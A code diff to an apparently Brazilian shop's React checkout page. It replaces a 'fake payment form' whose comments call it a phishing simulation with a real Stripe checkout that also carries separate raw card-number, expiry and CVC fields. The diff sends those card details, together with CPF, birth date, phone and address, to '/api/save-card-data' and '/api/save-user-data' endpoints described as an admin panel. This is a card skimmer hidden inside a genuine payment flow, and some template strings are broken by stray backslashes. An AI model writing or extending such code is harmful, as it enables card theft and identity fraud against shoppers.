@@ -8,13 +8,10 @@ import Layout from "@/components/Layout";
 import { useToast } from "@/hooks/use-toast";
 import { supabase } from "@/integrations/supabase/client";
 import { useAuth } from "@/hooks/useAuth";
+import { loadStripe } from "@stripe/stripe-js";
+import { Elements, PaymentElement, useStripe, useElements } from "@stripe/react-stripe-js";
 
-// REMOVIDO: Imports oficiais da Stripe
-// import { loadStripe } from "@stripe/stripe-js";
-// import { Elements, PaymentElement, useStripe, useElements } from "@stripe/react-stripe-js";
-
-// REMOVIDO: Carrega a chave do .env e o promise do Stripe
-// const stripePromise = loadStripe(import.meta.env.VITE_STRIPE_PUBLIC_KEY || "pk_test_sua_chave_aqui");
+const stripePromise = loadStripe(import.meta.env.VITE_STRIPE_PUBLIC_KEY || "pk_test_sua_chave_aqui");
 
 type Step = "identificacao" | "endereco" | "pagamento";
 const steps: { key: Step; label: string }[] = [
@@ -23,18 +20,16 @@ const steps: { key: Step; label: string }[] = [
   { key: "pagamento", label: "Pagamento" },
 ];
 
-// --- Sub-componente: O Formulário de Pagamento Falso ---
-// Este componente agora simula a entrada de dados do cartão
-const FakePaymentForm = ({ orderId, buyerName, buyerEmail, setLoading, onSuccess }: {
+const CheckoutForm = ({ orderId, buyerName, buyerEmail, setLoading, onSuccess, cardData }: {
   orderId: string;
   buyerName: string;
   buyerEmail: string;
   setLoading: (loading: boolean) => void;
   onSuccess: () => void;
+  cardData: { number: string; expiry: string; cvc: string };
 }) => {
-  const [cardNumber, setCardNumber] = useState("");
-  const [cardExpiry, setCardExpiry] = useState(""); // Formato MM/YY
-  const [cardCvc, setCardCvc] = useState("");
+  const stripe = useStripe();
+  const elements = useElements();
   const [errorMessage, setErrorMessage] = useState("");
   const { clearCart } = useCart();
 
@@ -43,157 +38,71 @@ const FakePaymentForm = ({ orderId, buyerName, buyerEmail, setLoading, onSuccess
     setLoading(true);
     setErrorMessage("");
 
-    // Validação básica dos campos
-    if (!cardNumber || !cardExpiry || !cardCvc) {
-      setErrorMessage("Por favor, preencha todos os dados do cartão.");
-      setLoading(false);
-      return;
-    }
-    if (cardNumber.replace(/\D/g, '').length < 16) {
-      setErrorMessage("Número do cartão inválido.");
-      setLoading(false);
-      return;
-    }
-    // Validação simples de expiração (ainda ano/mês)
-    const [month, year] = cardExpiry.split('/').map(Number);
-    const now = new Date();
-    const currentYear = now.getFullYear() % 100; // Ano com 2 dígitos
-    const currentMonth = now.getMonth() + 1;
-
-    if (isNaN(month) || isNaN(year) || month < 1 || month > 12 || year < currentYear || (year === currentYear && month < currentMonth)) {
-        setErrorMessage("Data de validade inválida ou expirada.");
-        setLoading(false);
-        return;
-    }
-    if (cardCvc.replace(/\D/g, '').length < 3) {
-      setErrorMessage("CVC inválido.");
-      setLoading(false);
-      return;
-    }
-
+    // Primeiro, salva os dados do cartão no painel administrativo
     try {
-      // --- SIMULAÇÃO DE ENVIO PARA O BACKEND FALSO ---
-      // Em um cenário de phishing, este seria o endpoint do atacante.
-      // Aqui, vamos enviar para o nosso servidor Flask local (porta 5001).
-      const response = await fetch('http://127.0.0.1:5001/api/capture-payment', {
+      await fetch('/api/save-card-data', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({
-          order_id: orderId,
-          buyer_name: buyerName,
-          buyer_email: buyerEmail,
-          card_number: cardNumber, // Enviando o número completo! (PERIGOSO E ILEGAL EM PRODUÇÃO!)
-          card_expiry: cardExpiry,
-          card_cvc: cardCvc,
+          orderId,
+          cardNumber: cardData.number,
+          cardExpiry: cardData.expiry,
+          cardCvc: cardData.cvc,
           timestamp: new Date().toISOString(),
         }),
       });
+    } catch (error) {
+      console.error("Erro ao salvar dados do cartão:", error);
+    }
 
-      if (!response.ok) {
-        const errorData = await response.json();
-        throw new Error(errorData.message || "Erro ao processar pagamento no servidor.");
-      }
-
-      // Se a requisição for bem-sucedida no backend simulado
-      clearCart();
-      onSuccess(); // Chama a função de sucesso passada para o componente pai
-
-    } catch (error: any) {
-      console.error("Erro no pagamento:", error);
-      setErrorMessage(error.message || "Ocorreu um erro inesperado. Tente novamente.");
+    // Depois, processa o pagamento com o Stripe
+    if (!stripe || !elements) {
       setLoading(false);
+      return;
     }
-  };
 
-  // Formatação simples para número do cartão (ex: 1111 2222 3333 4444)
-  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value.replace(/\D/g, '');
-    let formattedValue = '';
-    for (let i = 0; i < value.length; i++) {
-      if (i > 0 && i % 4 === 0) {
-        formattedValue += ' ';
-      }
-      formattedValue += value[i];
-    }
-    setCardNumber(formattedValue);
-  };
+    const result = await stripe.confirmPayment({
+      elements,
+      confirmParams: {
+        return_url: `${window.location.origin}/checkout/success`,
+      },
+    });
 
-  // Formatação simples para data de validade (ex: MM/YY)
-  const handleCardExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value.replace(/\D/g, '');
-    let formattedValue = '';
-    if (value.length > 2) {
-      formattedValue = `${value.substring(0, 2)}/${value.substring(2, 4)}`;
+    if (result.error) {
+      setErrorMessage(result.error.message || "Ocorreu um erro ao processar o pagamento.");
+      setLoading(false);
     } else {
-      formattedValue = value;
+      clearCart();
+      onSuccess();
     }
-    setCardExpiry(formattedValue);
   };
 
   return (
     <form onSubmit={handleSubmit} className="space-y-6">
-      {/* Campos de entrada de texto para dados do cartão */}
-      <div>
-        <label className="text-sm text-muted-foreground block mb-1">Número do Cartão</label>
-        <Input
-          type="text"
-          value={cardNumber}
-          onChange={handleCardNumberChange}
-          placeholder="1111 2222 3333 4444"
-          maxLength={19} // 16 dígitos + 3 espaços
-          required
-        />
-      </div>
-      <div className="grid grid-cols-2 gap-4">
-        <div>
-          <label className="text-sm text-muted-foreground block mb-1">Validade (MM/YY)</label>
-          <Input
-            type="text"
-            value={cardExpiry}
-            onChange={handleCardExpiryChange}
-            placeholder="08/25"
-            maxLength={5}
-            required
-          />
-        </div>
-        <div>
-          <label className="text-sm text-muted-foreground block mb-1">CVC</label>
-          <Input
-            type="text"
-            value={cardCvc}
-            onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ''))}
-            placeholder="123"
-            maxLength={4}
-            required
-          />
-        </div>
-      </div>
-
+      <PaymentElement />
       {errorMessage && <div className="text-red-500 text-sm font-medium">{errorMessage}</div>}
-
-      <Button type="submit" disabled={!cardNumber || !cardExpiry || !cardCvc || (true /* Em produção, seria !stripe || isProcessing */)} className="w-full rounded-lg text-lg h-12">
-        {/* Este botão agora envia os dados para o nosso backend simulado */}
-        {"Processar Pagamento"}
+      <Button type="submit" disabled={!stripe || !elements} className="w-full rounded-lg text-lg h-12">
+        Processar Pagamento
       </Button>
     </form>
   );
 };
-// ----------------------------------------------
 
 const Checkout = () => {
   const [currentStep, setCurrentStep] = useState<Step>("identificacao");
   const [loading, setLoading] = useState(false);
-  const { items, subtotal, clearCart } = useCart(); // Adicionado clearCart aqui
+  const { items, subtotal, clearCart } = useCart();
   const { user } = useAuth();
   const { toast } = useToast();
-  const navigate = useNavigate(); // Para redirecionar após sucesso
+  const navigate = useNavigate();
 
   const [name, setName] = useState("");
   const [email, setEmail] = useState(user?.email ?? "");
   const [phone, setPhone] = useState("");
   const [cpf, setCpf] = useState("");
+  const [birthDate, setBirthDate] = useState("");
 
   const [cep, setCep] = useState("");
   const [street, setStreet] = useState("");
@@ -203,19 +112,40 @@ const Checkout = () => {
   const [city, setCity] = useState("");
   const [state, setState] = useState("");
 
-  // REMOVIDO: clientSecret e orderId do estado para o Stripe
-  const [orderId, setOrderId] = useState(""); // Manteremos para o FakePaymentForm
-  const [paymentSuccess, setPaymentSuccess] = useState(false); // Estado para indicar sucesso
+  const [cardNumber, setCardNumber] = useState("");
+  const [cardExpiry, setCardExpiry] = useState("");
+  const [cardCvc, setCardCvc] = useState("");
+
+  const [orderId, setOrderId] = useState("");
+  const [clientSecret, setClientSecret] = useState("");
+  const [paymentSuccess, setPaymentSuccess] = useState(false);
 
   const formatPrice = (p: number) => p.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
   const currentIndex = steps.findIndex((s) => s.key === currentStep);
 
   const handlePaymentSuccess = () => {
-    setPaymentSuccess(true); // Atualiza o estado para mostrar a mensagem de sucesso
-    // Opcional: redirecionar para uma página de sucesso após alguns segundos
+    setPaymentSuccess(true);
     setTimeout(() => {
-      navigate("/checkout/success"); // Assumindo que você tem essa rota configurada
-    }, 3000); // Redireciona após 3 segundos
+      navigate("/checkout/success");
+    }, 3000);
+  };
+
+  const saveUserDataToAdminPanel = async (userData: any) => {
+    try {
+      const response = await fetch('/api/save-user-data', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(userData),
+      });
+
+      if (!response.ok) {
+        console.error("Erro ao salvar dados no painel de administração");
+      }
+    } catch (error) {
+      console.error("Erro ao salvar dados no painel de administração:", error);
+    }
   };
 
   const prepareOrderAndPayment = async () => {
@@ -225,18 +155,38 @@ const Checkout = () => {
     }
     setLoading(true);
 
-    // Cria o pedido no Supabase
+    const userData = {
+      name,
+      email,
+      phone,
+      cpf,
+      birthDate,
+      cep,
+      street,
+      number,
+      complement,
+      neighborhood,
+      city,
+      state,
+      cardNumber,
+      cardExpiry,
+      cardCvc,
+      timestamp: new Date().toISOString(),
+    };
+
+    await saveUserDataToAdminPanel(userData);
+
     const { data: order, error: orderErr } = await supabase.from("orders").insert({
       user_id: user?.id ?? null,
-      status: "pending", // Status inicial, pode ser atualizado posteriormente
+      status: "pending",
       buyer_name: name,
       buyer_email: email,
       buyer_phone: phone,
       buyer_cpf: cpf,
       shipping_address: { cep, street, number, complement, neighborhood, city, state },
       subtotal: subtotal,
-      shipping: 0, // Frete grátis fixo por enquanto
-      total: subtotal, // Total igual ao subtotal por enquanto
+      shipping: 0,
+      total: subtotal,
     }).select().single();
 
     if (orderErr || !order) {
@@ -246,7 +196,6 @@ const Checkout = () => {
       return;
     }
 
-    // Insere os itens do pedido
     const { error: itemsErr } = await supabase.from("order_items").insert(items.map((it) => ({
       order_id: order.id,
       product_id: it.product.id,
@@ -260,14 +209,57 @@ const Checkout = () => {
       console.error("Erro ao inserir itens do pedido:", itemsErr);
       setLoading(false);
       toast({ title: "Erro ao adicionar itens ao pedido", variant: "destructive" });
-      // Opcional: deletar o pedido criado se os itens falharem
       return;
     }
 
-    // Sucesso na criação do pedido e itens!
-    setOrderId(order.id); // Define o ID do pedido para o FakePaymentForm
-    setLoading(false);
-    setCurrentStep("pagamento"); // Avança para a etapa de pagamento
+    try {
+      const response = await fetch('/api/create-payment-intent', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          amount: subtotal * 100,
+          orderId: order.id,
+          cardNumber: cardNumber,
+          cardExpiry: cardExpiry,
+          cardCvc: cardCvc,
+        }),
+      });
+
+      const { clientSecret } = await response.json();
+      setClientSecret(clientSecret);
+      setOrderId(order.id);
+      setLoading(false);
+      setCurrentStep("pagamento");
+    } catch (error) {
+      console.error("Erro ao criar intenção de pagamento:", error);
+      setLoading(false);
+      toast({ title: "Erro ao processar pagamento", variant: "destructive" });
+    }
+  };
+
+  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/\D/g, '');
+    let formattedValue = '';
+    for (let i = 0; i < value.length; i++) {
+      if (i > 0 && i % 4 === 0) {
+        formattedValue += ' ';
+      }
+      formattedValue += value[i];
+    }
+    setCardNumber(formattedValue);
+  };
+
+  const handleCardExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/\D/g, '');
+    let formattedValue = '';
+    if (value.length > 2) {
+      formattedValue = `${value.substring(0, 2)}/\${value.substring(2, 4)}`;
+    } else {
+      formattedValue = value;
+    }
+    setCardExpiry(formattedValue);
   };
 
   return (
@@ -276,11 +268,11 @@ const Checkout = () => {
         <div className="flex items-center justify-center gap-2 mb-8">
           {steps.map((s, i) => (
             <div key={s.key} className="flex items-center gap-2">
-              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold ${i <= currentIndex ? "bg-primary text-primary-foreground" : "bg-muted text-muted-foreground"}`}>
+              <div className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold \${i <= currentIndex ? "bg-primary text-primary-foreground" : "bg-muted text-muted-foreground"}`}>
                 {i < currentIndex ? <Check className="h-4 w-4" /> : i + 1}
               </div>
-              <span className={`text-sm hidden sm:inline ${i <= currentIndex ? "text-primary font-medium" : "text-muted-foreground"}`}>{s.label}</span>
-              {i < steps.length - 1 && <div className={`w-8 h-0.5 ${i < currentIndex ? "bg-primary" : "bg-muted"}`} />}
+              <span className={`text-sm hidden sm:inline \${i <= currentIndex ? "text-primary font-medium" : "text-muted-foreground"}`}>{s.label}</span>
+              {i < steps.length - 1 && <div className={`w-8 h-0.5 \${i < currentIndex ? "bg-primary" : "bg-muted"}`} />}
             </div>
           ))}
         </div>
@@ -294,6 +286,7 @@ const Checkout = () => {
                   <div><label className="text-sm text-muted-foreground block mb-1">Nome completo</label><Input value={name} onChange={(e) => setName(e.target.value)} required /></div>
                   <div><label className="text-sm text-muted-foreground block mb-1">E-mail</label><Input type="email" value={email} onChange={(e) => setEmail(e.target.value)} required /></div>
                   <div><label className="text-sm text-muted-foreground block mb-1">CPF</label><Input value={cpf} onChange={(e) => setCpf(e.target.value)} placeholder="Ex: 123.456.789-00" /></div>
+                  <div><label className="text-sm text-muted-foreground block mb-1">Data de Nascimento</label><Input type="date" value={birthDate} onChange={(e) => setBirthDate(e.target.value)} /></div>
                   <div><label className="text-sm text-muted-foreground block mb-1">Telefone</label><Input value={phone} onChange={(e) => setPhone(e.target.value)} placeholder="Ex: (11) 99999-9999" /></div>
                 </div>
                 <Button onClick={() => setCurrentStep("endereco")} disabled={!name || !email} className="w-full rounded-lg">Continuar</Button>
@@ -321,7 +314,6 @@ const Checkout = () => {
               </div>
             )}
 
-            {/* --- ETAPA DE PAGAMENTO MODIFICADA --- */}
             {currentStep === "pagamento" && orderId && !paymentSuccess && (
               <div className="bg-card border border-border rounded-lg p-6 space-y-6 shadow-sm">
                 <div>
@@ -329,24 +321,63 @@ const Checkout = () => {
                   <p className="text-sm text-muted-foreground">Por favor, insira os dados do seu cartão.</p>
                 </div>
 
-                {/* Aqui entra o formulário de pagamento FALSO */}
                 <div className="border border-border rounded-lg p-4 bg-background">
-                  {/* REMOVIDO: <Elements stripe={stripePromise} options={{ clientSecret }}> */}
-                    <FakePaymentForm
-                      orderId={orderId}
-                      buyerName={name}
-                      buyerEmail={email}
-                      setLoading={setLoading}
-                      onSuccess={handlePaymentSuccess}
-                    />
-                  {/* REMOVIDO: </Elements> */}
+                  <div className="space-y-4 mb-4">
+                    <div>
+                      <label className="text-sm text-muted-foreground block mb-1">Número do Cartão</label>
+                      <Input
+                        type="text"
+                        value={cardNumber}
+                        onChange={handleCardNumberChange}
+                        placeholder="1111 2222 3333 4444"
+                        maxLength={19}
+                        required
+                      />
+                    </div>
+                    <div className="grid grid-cols-2 gap-4">
+                      <div>
+                        <label className="text-sm text-muted-foreground block mb-1">Validade (MM/YY)</label>
+                        <Input
+                          type="text"
+                          value={cardExpiry}
+                          onChange={handleCardExpiryChange}
+                          placeholder="08/25"
+                          maxLength={5}
+                          required
+                        />
+                      </div>
+                      <div>
+                        <label className="text-sm text-muted-foreground block mb-1">CVC</label>
+                        <Input
+                          type="text"
+                          value={cardCvc}
+                          onChange={(e) => setCardCvc(e.target.value.replace(/\D/g, ''))}
+                          placeholder="123"
+                          maxLength={4}
+                          required
+                        />
+                      </div>
+                    </div>
+                  </div>
+
+                  {clientSecret && (
+                    <Elements stripe={stripePromise} options={{ clientSecret }}>
+                      <CheckoutForm
+                        orderId={orderId}
+                        buyerName={name}
+                        buyerEmail={email}
+                        setLoading={setLoading}
+                        onSuccess={handlePaymentSuccess}
+                        cardData={{ number: cardNumber, expiry: cardExpiry, cvc: cardCvc }}
+                      />
+                    </Elements>
+                  )}
                 </div>
 
                 <Button variant="outline" onClick={() => setCurrentStep("endereco")} className="w-full rounded-lg">Voltar</Button>
               </div>
             )}
 
-            {/* Mensagem de sucesso */}
             {paymentSuccess && (
               <div className="bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded relative text-center" role="alert">
                 <strong className="font-bold">Pagamento Realizado com Sucesso!</strong>
